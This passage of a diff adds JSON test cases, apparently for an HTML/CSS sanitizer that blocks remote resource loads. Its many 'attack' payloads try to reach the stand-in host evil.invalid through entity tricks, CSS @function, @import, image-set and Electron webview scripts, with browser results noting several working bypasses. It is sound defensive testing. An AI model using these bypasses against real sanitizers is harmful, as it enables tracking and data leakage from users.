+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href slash backslash",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"/\\evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src backslash slash",
+  "kind": "attack",
+  "html": "<img src=\"\\/evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href backslash slash",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"\\/evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src trailing junk",
+  "kind": "attack",
+  "html": "<img src=\"//evil.invalid/x&#9;\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href trailing junk",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"//evil.invalid/x&#9;\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() trailing junk",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;//evil.invalid/x&#9;&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src entity-hidden colon",
+  "kind": "attack",
+  "html": "<img src=\"https&colon;//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href entity-hidden colon",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"https&colon;//evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() entity-hidden colon",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;https&colon;//evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src entity-hidden slash",
+  "kind": "attack",
+  "html": "<img src=\"https:&sol;&sol;evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href entity-hidden slash",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"https:&sol;&sol;evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() entity-hidden slash",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;https:&sol;&sol;evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src numeric entity h",
+  "kind": "attack",
+  "html": "<img src=\"&#104;ttps://evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href numeric entity h",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"&#104;ttps://evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() numeric entity h",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;&#104;ttps://evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src hex entity h no semicolon",
+  "kind": "attack",
+  "html": "<img src=\"&#x68ttps://evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href hex entity h no semicolon",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"&#x68ttps://evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() hex entity h no semicolon",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;&#x68ttps://evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 J -webkit- image-set only string, uppercase",
+  "kind": "attack",
+  "html": "<style>.rv2{background:-WEBKIT-IMAGE-SET(\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 J image-set string w/ gradient fallback",
+  "kind": "attack",
+  "html": "<style>.rv2{background:linear-gradient(red,blue);background:image-set(\"a.png\" 2x,\"https://evil.invalid/x\" 1x,linear-gradient(red,blue) 3x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 J link prefetch/preconnect/dns-prefetch",
+  "kind": "attack",
+  "html": "<link rel=\"preconnect\" href=\"https://evil.invalid\"><link rel=\"dns-prefetch\" href=\"//evil.invalid\"><link rel=\"prefetch\" href=\"https://evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 J noscript img with scripting off",
+  "kind": "attack",
+  "html": "<noscript><img src=\"https://evil.invalid/x\"></noscript>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 J svg image in symbol unused",
+  "kind": "attack",
+  "html": "<svg><symbol id=\"s\"><image href=\"https://evil.invalid/x\" width=\"1\" height=\"1\"/></symbol></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 J nested svg style with 2 levels each safe/unsafe",
+  "kind": "attack",
+  "html": "<svg><style>a{color:red}<style>@import \"https://evil.invalid/x\";</style></style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | inner svg style nested in outer safe one"
+ },
+ {
+  "name": "r2 J svg style text split into two text nodes by comment child",
+  "kind": "attack",
+  "html": "<svg><style>@import <!-- c -->\"https://evil.invalid/x\";</style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | comment node between text nodes; textContent skips comments"
+ },
+ {
+  "name": "r2 J svg style with processing-instruction-like",
+  "kind": "attack",
+  "html": "<svg><style>@import <?pi x?>\"https://evil.invalid/x\";</style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | bogus comment in HTML"
+ },
+ {
+  "name": "r2 J style: @import after html-escaped < ",
+  "kind": "attack",
+  "html": "<style>@import \"https://evil.invalid/x\";</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 L1 @function returns bare string, used in image-set",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L2 @function returns bare string, -webkit-image-set",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{background:-webkit-image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L3 @function with param, string passed in call",
+  "kind": "attack",
+  "html": "<style>@function --f(--a <string>){result:var(--a)}.rv2{background:image-set(--f(\"https://evil.invalid/x\") 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=2 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=2 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L4 @function returns string, used in src()",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{background:src(--f())}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L5 @function returns string; used in content: image-set",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2::before{content:image-set(--f() 1x);display:block;width:9px;height:9px}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L6 @function returns url token via string concat in url?",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{background:url(--f())}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1 | url(--f()) is a bad url, no ca"
+ },
+ {
+  "name": "r2 L7 @function with typed return <string> and local default",
+  "kind": "attack",
+  "html": "<style>@function --f(--a <string>:\"a.png\") returns <string>{result:var(--a)}.rv2{background:image-set(--f(\"https://evil.invalid/x\") 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L8 @function in custom property then image-set(var()) (flagged var)",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{--s:--f();background:image-set(var(--s) 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L9 @function in @import? (not valid)",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}@import --f();</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L10 @function returning url() (flagged by url)",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:url(https://evil.invalid/x)}.rv2{background:--f()}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L11 @function result string + if()",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:if(style(--x:1):\"https://evil.invalid/x\";else:\"a.png\")}.rv2{--x:1;background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=2, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=2 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L12 @function body string where whole string is in the style ATTR? no - style element only; arbitrary-substitution via @property",
+  "kind": "attack",
+  "html": "<style>@property --s{syntax:\"<string>\";inherits:false;initial-value:\"https://evil.invalid/x\"}.rv2{background:image-set(var(--s) 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L13 @property <string> + @function reading it",
+  "kind": "attack",
+  "html": "<style>@property --s{syntax:\"<string>\";inherits:false;initial-value:\"https://evil.invalid/x\"}@function --f(){result:var(--s)}.rv2{background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit+firefox) | chrome c=1 t=1, webkit c=1 t=1, firefox c=1 t=1 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L14 control: plain image-set string",
+  "kind": "attack",
+  "html": "<style>.rv2{background:image-set(\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L16 string via counter/attr/format: content then image-set(var)",
+  "kind": "attack",
+  "html": "<style>.rv2{--s:\"https://evil.invalid/x\";background:image-set(var(--s) 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 L18 css nesting selector hack inside @function",
+  "kind": "attack",
+  "html": "<style>@function --f(){@media all{result:\"https://evil.invalid/x\"}}.rv2{background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand4] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M0 @function definition alone (nothing calls it)",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | chrome c=0 t=0, webkit c=0 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=0 t=0 rem=1, webkit c=0 t=0 rem=1"
+ },
+ {
+  "name": "r2 M1 @function call in image-set, minimal",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M2 @function call as @import target",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}@import --f();</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M3 @function call in @import after other rules? (late import)",
+  "kind": "attack",
+  "html": "<style>.a{}@function --f(){result:\"https://evil.invalid/x\"}@import --f();</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M4 @function inside svg <style>",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{fill:red;background:image-set(--f() 1x)}</style><rect class=\"rv2\" width=\"10\" height=\"10\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M5 @function result: escaped quote and comment",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:/*x*/\"https://evil.invalid/x\"/*y*/}.rv2{background:image-set(--f()/**/1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=3, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=2 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M6 @function name with uppercase/escape; image-set escaped",
+  "kind": "attack",
+  "html": "<style>@function --F(){result:\"https://evil.invalid/x\"}.rv2{background:\\69mage-set(--F() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=20, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=12 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M7 style attr calling function defined in a <style>",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}</style><div class=\"rv2\" style=\"background:image-set(--f() 1x)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=2, webkit c=1 t=0 rem=2"
+ },
+ {
+  "name": "r2 M8 style attr calling function defined in a second svg <style>",
+  "kind": "attack",
+  "html": "<svg width=\"1\" height=\"1\"><style>@function --f(){result:\"https://evil.invalid/x\"}</style></svg><div class=\"rv2\" style=\"background-image:-webkit-image-set(--f() 1x)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=2, webkit c=1 t=0 rem=2"
+ },
+ {
+  "name": "r2 M9 @function in a style element + cursor",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}.rv2{cursor:image-set(--f() 1x),auto}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M10 @function in @media",
+  "kind": "attack",
+  "html": "<style>@media all{@function --f(){result:\"https://evil.invalid/x\"}}.rv2{background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1 | @function inside @media is probably inva"
+ },
+ {
+  "name": "r2 M11 @function: url string via 'result: url(--g())' nested",
+  "kind": "attack",
+  "html": "<style>@function --g(){result:\"https://evil.invalid/x\"}@function --f(){result:image-set(--g() 1x)}.rv2{background:--f()}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M12 @function result type <image> with string",
+  "kind": "attack",
+  "html": "<style>@function --f() returns <image>{result:image-set(\"https://evil.invalid/x\" 1x)}.rv2{background:--f()}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | chrome c=0 t=0, webkit c=0 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=0 t=0 rem=1, webkit c=0 t=0 rem=1 | contains im"
+ },
+ {
+  "name": "r2 M13 attr-free: custom function inside font src",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}@font-face{font-family:frv2;src:url(--f())}.rv2{font-family:frv2}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M14 @function with default arg holding string",
+  "kind": "attack",
+  "html": "<style>@function --f(--a:\"https://evil.invalid/x\"){result:var(--a)}.rv2{background:image-set(--f() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 M15 @function arg passed as a custom ident / unquoted token",
+  "kind": "attack",
+  "html": "<style>@function --f(--a){result:var(--a)}.rv2{background:image-set(--f(\"https://evil.invalid/x\") 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand5] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 N font-face src via function",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}@font-face{font-family:frv2;src:--f()}.rv2{font-family:frv2}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand6] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | chrome c=0 t=0, webkit c=0 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=0 t=0 rem=1, webkit c=0 t=0 rem=1"
+ },
+ {
+  "name": "r2 N font-face src url(string) + local",
+  "kind": "attack",
+  "html": "<style>@font-face{font-family:frv2;src:local(\"zz\"),url(\"https://evil.invalid/x\")}.rv2{font-family:frv2}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand6] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=2 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 N @import --f() with arg",
+  "kind": "attack",
+  "html": "<style>@function --f(--a){result:var(--a)}@import --f(\"https://evil.invalid/x\");</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand6] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | chrome c=0 t=0, webkit c=0 t=0, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=0 t=0 rem=1, webkit c=0 t=0 rem=1 | string at c"
+ },
+ {
+  "name": "r2 N image-set(--f() ) via custom property indirection (no var at call site)",
+  "kind": "attack",
+  "html": "<style>@function --f(){result:\"https://evil.invalid/x\"}@function --g(){result:--f()}.rv2{background:image-set(--g() 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand6] UMGEHUNG gemessen (chrome+webkit) | chrome c=1 t=1, webkit c=1 t=1, firefox c=0 t=0 | mit Patch-Vorschlag: chrome c=1 t=0 rem=1, webkit c=1 t=0 rem=1"
+ },
+ {
+  "name": "r2 W1 webview src=data:text/html with remote img",
+  "kind": "attack",
+  "html": "<webview src=\"data:text/html,%3Cimg%20src%3D%22https%3A//evil.invalid/guest-img%22%3E\" style=\"width:50px;height:50px\"></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | | Electron only: unknown element in plain Chromium"
+ },
+ {
+  "name": "r2 W2 webview data: script reports typeof require, nodeintegration attr",
+  "kind": "attack",
+  "html": "<webview src=\"data:text/html,%3Cscript%3Enew%20Image().src%3D%27https%3A//evil.invalid/node-%27%2Btypeof%20require%3C/script%3E\" nodeintegration style=\"width:50px;height:50px\"></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "r2 W3 webview data: script fetch to remote (no nodeintegration)",
+  "kind": "attack",
+  "html": "<webview src=\"data:text/html,%3Cscript%3Efetch(%27https%3A//evil.invalid/fetch%27)%3C/script%3E\" style=\"width:50px;height:50px\"></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "r2 W4 webview src=https remote",
+  "kind": "attack",
+  "html": "<webview src=\"https://evil.invalid/x\" style=\"width:50px;height:50px\"></webview>",
+  "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "r2 W5 webview src=app:// local",
+  "kind": "attack",
+  "html": "<webview src=\"app://obsidian.md/x\" style=\"width:50px;height:50px\"></webview>",
